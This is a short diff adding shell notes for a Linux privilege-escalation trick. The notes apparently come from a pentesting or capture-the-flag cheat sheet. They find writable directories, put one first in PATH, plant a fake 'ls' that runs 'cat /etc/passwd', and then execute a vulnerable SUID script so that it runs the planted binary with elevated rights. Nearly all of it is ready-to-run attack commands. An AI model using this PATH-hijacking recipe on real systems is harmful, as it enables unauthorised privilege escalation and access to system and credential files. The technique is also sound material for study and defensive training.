@@ -1,0 +1,14 @@
+#  Find writeable directories
+find / -writable
+
+#  Overwrite your PATH to include this writeable directory first, so you can call it in your SUID script
+env
+export PATH=/writeable_directory:/other/stuff/from/original/PATH
+
+#  Depending on what is called upon in your script, create a dummy file in the writeable directory
+##  Let's assume that the script calls upon ls to do something
+echo "cat /etc/passwd" > /writeable_directory/ls
+chmod +x /writeable_directory/ls
+
+#  Execute the SUID script
+/some/path/vulnscript
